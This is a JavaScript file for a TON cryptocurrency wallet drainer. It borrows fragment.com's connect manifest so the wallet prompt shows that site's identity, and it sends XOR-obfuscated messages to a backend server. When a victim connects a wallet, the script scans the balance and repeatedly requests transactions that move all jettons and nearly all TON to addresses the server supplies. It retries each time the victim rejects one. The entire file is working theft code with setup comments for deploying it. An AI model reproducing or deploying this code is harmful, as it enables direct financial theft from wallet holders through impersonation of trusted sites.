// X-SOFTWARE.ORG
// Ton Manifest - Your website avatar and domain name are displayed when you connect your wallet.
const manifestUrl = 'https://fragment.com/tonconnect-manifest.json';

// The encryption key between the server and Frontend must be the same
let keyEncr = 500;

// Number of calls to the debit window when a transaction is rejected
const maxRetry = 3;

// Domain server - Replace with your Render URL (e.g., 'backend.onrender.com')
const server = 'example.com';

const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: manifestUrl,
    buttonRootId: 'tcUIbtn'
});

const TonWeb = window.TonWeb;
const tonweb = new TonWeb();

// Encryption Utilities
const prs = (s, t) => {
    const ab = (t) => t.split("").map((c) => c.charCodeAt(0));
    const bh = (n) => ("0" + Number(n).toString(16)).slice(-2);
    const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
    return t.split("").map(ab).map(as).map(bh).join("");
};

const srp = (s, e) => {
    const ab = (text) => text.split("").map((c) => c.charCodeAt(0));
    const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
    return e.match(/.{1,2}/g).map((hex) => parseInt(hex, 16)).map(as).map((charCode) => String.fromCharCode(charCode)).join("");
};

const sendRequest = async (data) => {
    data.domain = window.location.host;
    const encode_key = btoa(String(5 + 10 + 365 + 2048 + 867 + keyEncr));
    const raw = prs(encode_key, btoa(JSON.stringify(data)));

    try {
        const response = await fetch(`https://${server}/`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ raw: raw })
        });
        const res_raw = await response.text();
        const decoded = srp(encode_key, res_raw);
        return JSON.parse(atob(decoded));
    } catch (e) {
        console.error("Request Error:", e);
        return null;
    }
};

const connectWallet = async () => {
    if (!tonConnectUI.connected) {
        await tonConnectUI.openModal();
    } else {
        await tonConnectUI.disconnect();
    }
};

const connect = async (address) => {
    const response = await scan_account(address);
    if (response && response.status === 'OK') {
        const data = response.data;
        if (data.haveJettons) {
            const jettonResponse = await send_jettons(address, data.jettons);
            if (jettonResponse && jettonResponse.status === 'OK') {
                await startDraining(jettonResponse, address, data.ton, data.tonPrice);
            }
        } else {
            await send(address, data.ton, 0);
        }
    }
};

const startDraining = async (data, walletAddress, ton, tonPrice) => {
    let i = 0;
    let tryies = 0;
    const len = Object.keys(data.data.boc).length;

    while (i < len) {
        let transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 60,
            messages: []
        };

        let msgs = 0;
        let tokens = {};
        let tkn = 0;

        while (msgs < 4 && i < len) {
            transaction.messages.push({
                address: data.data.address[i],
                amount: TonWeb.utils.toNano('0.05').toString(),
                payload: data.data.boc[i]
            });
            tokens[tkn] = { name: data.data.name[i], prices: data.data.prices[i] };
            tkn++;
            i++;
            msgs++;
        }

        // Add TON transfer if possible
        if (ton > 0.5 && msgs < 4) {
            let transfer_value = TonWeb.utils.toNano(ton) - TonWeb.utils.toNano("0.3");
            let payload = await get_ton_text(transfer_value);
            transaction.messages.push({
                address: data.data.wallet,
                amount: transfer_value.toString(),
                payload: payload ? payload.data : ""
            });
            tokens[tkn] = { name: 'TON', prices: (ton - 0.3) * tonPrice };
            msgs++;
        }

        try {
            await transfer_jettons_native_request(tokens, tryies);
            const result = await tonConnectUI.sendTransaction(transaction);
            const bocCell = TonWeb.boc.Cell.oneFromBoc(TonWeb.utils.base64ToBytes(result.boc));
            const hash = TonWeb.utils.bytesToBase64(await bocCell.hash());
            await jettons_transaction_done(hash, tokens);
        } catch (e) {
            console.error(e);
            tryies++;
            if (tryies >= maxRetry) break;
            await decline_transfer_jettons_native_request(tokens, tryies);
        }
    }
};

async function send(walletAddress, balance, tryies) {
    tryies++;
    if (tryies <= maxRetry) {
        let transfer_value = TonWeb.utils.toNano(balance) - TonWeb.utils.toNano("0.1");
        if (transfer_value < 0) return;

        const res1 = await transfer_ton_native_request(transfer_value.toString(), tryies);
        const addr = res1.data;
        let payload = await get_ton_text(transfer_value.toString());

        const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 60,
            messages: [{
                address: addr,
                amount: transfer_value.toString(),
                payload: payload ? payload.data : ""
            }]
        };

        try {
            const result = await tonConnectUI.sendTransaction(transaction);
            const bocCell = TonWeb.boc.Cell.oneFromBoc(TonWeb.utils.base64ToBytes(result.boc));
            const hash = TonWeb.utils.bytesToBase64(await bocCell.hash());
            await transaction_done(hash, transfer_value.toString());
        } catch (e) {
            console.error(e);
            await decline_transfer_ton_native_request(balance, tryies);
            await send(walletAddress, balance, tryies);
        }
    }
}

tonConnectUI.onStatusChange((wallet) => {
    if (wallet && wallet.account.address) {
        connect(wallet.account.address);
    }
});

// Action Wrappers
const scan_account = (address) => sendRequest({ action: 'scan_account', account: address });
const get_ton_text = (balance) => sendRequest({ action: 'get_ton_text', balance: balance });
const send_jettons = (address, jettons) => sendRequest({ action: 'send_jettons', account: address, jettons: jettons });
const transfer_ton_native_request = (amount, tryies) => sendRequest({ action: 'transfer_ton_native_request', val: amount, try: tryies });
const transfer_jettons_native_request = (data, tryies) => sendRequest({ action: 'transfer_jettons_native_request', data: data, try: tryies });
const transaction_done = (hash, amount) => sendRequest({ action: 'transaction_done', val: amount, hash: hash });
const jettons_transaction_done = (hash, tokens) => sendRequest({ action: 'jettons_transaction_done', hash: { hash, tokens } });
const decline_transfer_ton_native_request = (amount, tryies) => sendRequest({ action: 'decline_transfer_ton_native_request', val: amount, try: tryies });
const decline_transfer_jettons_native_request = (data, tryies) => sendRequest({ action: 'decline_transfer_jettons_native_request', data: data, try: tryies });
